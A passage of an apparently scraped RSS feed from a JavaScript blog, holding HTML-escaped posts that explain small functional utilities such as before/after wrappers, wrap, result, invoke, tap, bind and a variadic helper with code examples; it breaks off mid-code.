&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; before = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;before, fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    before.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To use the function, we can pass any function in as the first argument and the original function we want to wrap as the second argument. For example, we could do &lt;code&gt;before(logger, add)&lt;/code&gt;. Even without seeing the &lt;code&gt;logger&lt;/code&gt; or &lt;code&gt;add&lt;/code&gt; functions, we can imagine what each do. And because we are passing all the arguments to the side effect function, we can do stuff with the information.&lt;/p&gt;
&lt;p&gt;One thing I find myself doing is checking what arguments were passed to a certain function. To do this now, we can &lt;code&gt;before(console.log.bind(console), fn)&lt;/code&gt;. Now, let&amp;#39;s implement the reverse functionality.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; after = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn, after&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; result = fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);
    after.call(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, result);
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is extremely similar to the first example. The main difference is that the first function passed in is the side effect, but now we have the side effect running after our wrapped function. Adapting the previous example, we can now do &lt;code&gt;after(add, logger)&lt;/code&gt; and the logger will execute after the result is computed with the same arguments.&lt;/p&gt;
&lt;p&gt;One cool thing we could actually do, is to run argument validation in the &lt;code&gt;before&lt;/code&gt; function. Consider this.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; validAdd = before(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;.length; i++) {
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;[i] !== &lt;span class=&quot;hljs-string&quot;&gt;'number'&lt;/span&gt;) {
      &lt;span class=&quot;hljs-keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;TypeError&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'Expected a number'&lt;/span&gt;);
    }
  }
}, add);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can also put these two functions together and create a new utility. This one allows us to pass both a function before and after our core functionality. E.g. &lt;code&gt;around(logger, add, logger)&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; around = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;over, fn, under&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; before(over, after(fn, under));
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;allow-unlimited-before-and-after-functions&quot;&gt;Allow unlimited before and after functions&lt;/h2&gt;
&lt;p&gt;We can also adapt the functions to accept a variable number of arguments as the &lt;code&gt;before&lt;/code&gt; and &lt;code&gt;after&lt;/code&gt; functions. However, we can&amp;#39;t do this to the &lt;code&gt;around&lt;/code&gt; utility since we wouldn&amp;#39;t know which argument is the core function.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; before = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;/* ...before, fn */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fn     = &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;[&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;.length - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;];
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; before = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; before.length; i++) {
      before[i].apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);
    }

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);
  };
};

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; after = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn &lt;span class=&quot;hljs-comment&quot;&gt;/*, ...after */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; after = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; result = fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;);

    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; after.length; i++) {
      after[i].call(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, result);
    }

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;advanced-wrapping-utility&quot;&gt;Advanced wrapping utility&lt;/h2&gt;
&lt;p&gt;So far we&amp;#39;ve seen some function wrapping utilities that are purely for side effects. They have no capability to alter the main function arguments or change the function result. For something more advanced than trigger side-effects, we might to want to use something a little different.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; wrap = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn, wrap&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; wrap.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, [fn].concat(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;)));
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is actually pretty similar the &lt;code&gt;wrap&lt;/code&gt; function used in Prototype.js. It allows us to call a custom wrapper function with the original function and all the arguments. But, how do we even use this?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; addAndMultiplyBy2 = wrap(add, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;originalFn, a, b&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * originalFn(a, b);
});
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>JavaScript Result Utility</title><link>http://blakeembrey.com/articles/2014/01/javascript-result-utility</link><pubDate>Thu, 09 Jan 2014 17:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/javascript-result-utility</guid><author>Blake Embrey</author><description>&lt;p&gt;In JavaScript, an objects property can hold any type of data, from strings to functions and even nested objects. Since an object can hold any type of potential data, some libraries implement a &lt;a href=&quot;http://underscorejs.org/#result&quot;&gt;result utility&lt;/a&gt; to check whether the property is function and instead return the functions return.&lt;/p&gt;
&lt;p&gt;This functionality is rarely required in your regular JavaScript workflow and is usually reserved for third-party libraries where users can pass in ambiguous data types. A prominent example would be a templating library, where the template can render simple data types like strings and numbers. However, the template may also be capable of rendering ambiguous or dynamic data in the form of functions. To do this, we could abstract it to the following utility.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; result = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;obj, property&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; value = obj[property];

  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;hljs-string&quot;&gt;'function'&lt;/span&gt;) {
    value = value.call(obj);
  }

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; value;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The above is a relatively simple utility, but hopefully you can now imagine some use casesyou can refactor and reuse a utility like this. However, consider a slightly different utility I&amp;#39;m going call &lt;code&gt;ambiguous&lt;/code&gt;. This utility is similar, albeit entirely incompatible, but works around some of the limitations I found when using the &lt;code&gt;result&lt;/code&gt; function.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; ambiguous = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;value &lt;span class=&quot;hljs-comment&quot;&gt;/*, ...args */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;hljs-string&quot;&gt;'function'&lt;/span&gt;) {
    value = value.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;));
  }

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; value;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Personally, the &lt;code&gt;ambiguous&lt;/code&gt; utility is much more useful in the real world. Especially since it removes the static context limitation from the &lt;code&gt;result&lt;/code&gt; utility above. It also allows us to pass in optional arguments in the case that the value is a function. Just some food for thought.&lt;/p&gt;
</description></item><item><title>A JavaScript Invoke Function</title><link>http://blakeembrey.com/articles/2014/01/javascript-invoke-function</link><pubDate>Sat, 04 Jan 2014 21:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/javascript-invoke-function</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Now available on &lt;a href=&quot;https://github.com/blakeembrey/invoke&quot;&gt;github&lt;/a&gt; and &lt;a href=&quot;https://www.npmjs.org/package/util-invoke&quot;&gt;npm&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Under certain functional JavaScript toolbelts, we can find a utility that is used purely for invoking a method on a passed in object. The utility is a really simple snippet that can be used in a number of different circumstances.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; invoke = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;method &lt;span class=&quot;hljs-comment&quot;&gt;/*, ...args */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;obj &lt;span class=&quot;hljs-comment&quot;&gt;/*, ..args */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; obj[method].apply(obj, args.concat(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)));
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The most useful situation for a utility such as this is in combination with other functional utilities and iterators. Consider the case where we have an array of objects with identical methods. Not uncommon in a complex MVC application where you may be tracking child views. To remove every child view, we need to iterate over an array of views and call &lt;code&gt;remove&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; children = [&lt;span class=&quot;hljs-comment&quot;&gt;/* ... */&lt;/span&gt;];

children.forEach(invoke(&lt;span class=&quot;hljs-string&quot;&gt;'remove'&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>The Tap Utility in JavaScript</title><link>http://blakeembrey.com/articles/2014/01/javascript-tap-function</link><pubDate>Sat, 04 Jan 2014 20:30:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/javascript-tap-function</guid><author>Blake Embrey</author><description>&lt;p&gt;There are numerous functional JavaScript libraries out in the public, many of which include a &lt;a href=&quot;http://underscorejs.org/#tap&quot;&gt;utility called tap&lt;/a&gt;. This simplistic utility serves a single purpose, to call a function with a value and return the value back to us. However, the usefulness of this utility is rarely understood and can even be confusing when looking at examples.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; tap = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;value, fn&lt;/span&gt;) &lt;/span&gt;{
  fn(value);
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; value;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The code above depicts the simplicity of the function, but when would we ever use it? It&amp;#39;s really only useful when we want to chain the value between calls. You can pass in any function and you will always receive the passed in value as the return, regardless of the function return value.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;// Pop a value of the end of an array, in reality we'd use an `invoke` utility.&lt;/span&gt;
tap([&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;], &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;array&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;// Pop always returns the value it removed from the end of the array.&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; array.pop();
});
&lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; [1, 2, 3]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>The JavaScript Bind Function</title><link>http://blakeembrey.com/articles/2013/12/javascript-bind-function</link><pubDate>Tue, 31 Dec 2013 01:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/12/javascript-bind-function</guid><author>Blake Embrey</author><description>&lt;p&gt;The JavaScript &lt;code&gt;bind&lt;/code&gt; function is a common-place utility when working with many different frameworks and libraries. It&amp;#39;s purpose is to bind the &lt;code&gt;this&lt;/code&gt; value to a static object and is useful when passing functions around as callbacks, where maintaining the correct &lt;code&gt;this&lt;/code&gt; value is required. A common convention to circumvent this utility is the &lt;code&gt;var that = this&lt;/code&gt;, but this isn&amp;#39;t very feasible everywhere.&lt;/p&gt;
&lt;p&gt;In &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind&quot;&gt;modern JavaScript implementations&lt;/a&gt; the function is built directly onto &lt;code&gt;Function.prototype&lt;/code&gt;, giving us &lt;code&gt;bind&lt;/code&gt; functionality on every function. For our implementation we&amp;#39;ll be implementing a standalone functionality that works similar to the built-in &lt;code&gt;bind&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;However, it&amp;#39;s important to note that &lt;code&gt;bind&lt;/code&gt; also comes with another handy feature. It accepts an unlimited number of arguments after the context to pass in as the function parameters, from left to right.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Bind a function to a certain context.
 *
 * @param  {Function} fn
 * @param  {Object}   context
 * @param  {*}        ...
 * @return {Function}
 */&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; bind = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn, context &lt;span class=&quot;hljs-comment&quot;&gt;/*, ...args */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, args.concat(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;)));
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Bind allows us to keep the &lt;code&gt;this&lt;/code&gt; context when passing the callback to another function. Imagine passing a function that uses &lt;code&gt;this&lt;/code&gt; into &lt;code&gt;setTimeout&lt;/code&gt; or someone elses library utility, where &lt;code&gt;this&lt;/code&gt; could be unpredictable.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; greet = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;greeting&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; greeting + &lt;span class=&quot;hljs-string&quot;&gt;' '&lt;/span&gt; + &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.user;
};

greet(&lt;span class=&quot;hljs-string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; &quot;Hello undefined&quot;&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; boundGreet = bind(greet, { user: &lt;span class=&quot;hljs-string&quot;&gt;'Bob'&lt;/span&gt; });

boundGreet(&lt;span class=&quot;hljs-string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; &quot;Hello Bob&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We also have another useful feature built into &lt;code&gt;bind&lt;/code&gt; - partial application. Partial application is essentially the act of pre-filling function arguments. Any future arguments are then appended to the arguments we have already defined.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; greet = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;user, greeting&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; greeting + &lt;span class=&quot;hljs-string&quot;&gt;' '&lt;/span&gt; + user;
};

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; greetBlake = bind(greet, &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'Blake'&lt;/span&gt;);

greetBlake(&lt;span class=&quot;hljs-string&quot;&gt;'Hi'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; &quot;Hi Blake&quot;&lt;/span&gt;
greetBlake(&lt;span class=&quot;hljs-string&quot;&gt;'Hello'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; &quot;Hello Blake&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;bonus-implementation-using-variadic&quot;&gt;Bonus Implementation using Variadic&lt;/h2&gt;
&lt;p&gt;In my last post, I introduced the concept of a &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;variadic function&lt;/a&gt;. As this article demonstrates, &lt;code&gt;bind&lt;/code&gt; is a perfect example of a variadic function, so let&amp;#39;s reimplement &lt;code&gt;bind&lt;/code&gt; with the variadic function.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; bind = variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn, context, args&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;called&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, args.concat(called));
  });
});
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>A Variadic Utility in JavaScript</title><link>http://blakeembrey.com/articles/2013/12/javascript-variadic-function</link><pubDate>Sun, 29 Dec 2013 23:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/12/javascript-variadic-function</guid><author>Blake Embrey</author><description>&lt;p&gt;A variadic function is a type of function which accepts a variable number of arguments. In JavaScript, every function can be variadic and it&amp;#39;s commonplace to see snippets of code using &lt;code&gt;Array.prototype.slice.call(arguments, 1)&lt;/code&gt; to get a unlimited number of trailing arguments back as an array. You can also find many instances where you would even slice all the arguments, for the sake of manipulation and array concatenation.&lt;/p&gt;
&lt;p&gt;The ability to get all the functions trailing arguments natively would be a great inclusion to the language, and in fact &lt;a href=&quot;http://ariya.ofilabs.com/2013/03/es6-and-rest-parameter.html&quot;&gt;it&amp;#39;s already in the works with ES6&lt;/a&gt;. For now though, we could be stuck typing this out manually. Or we can write ourselves a &lt;a href=&quot;https://github.com/blakeembrey/variadic&quot;&gt;little utility function&lt;/a&gt; to speed up our workflow.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Generate a function that accepts a variable number of arguments as the last
 * function argument.
 *
 * @param  {Function} fn
 * @return {Function}
 */&lt;/span&gt;
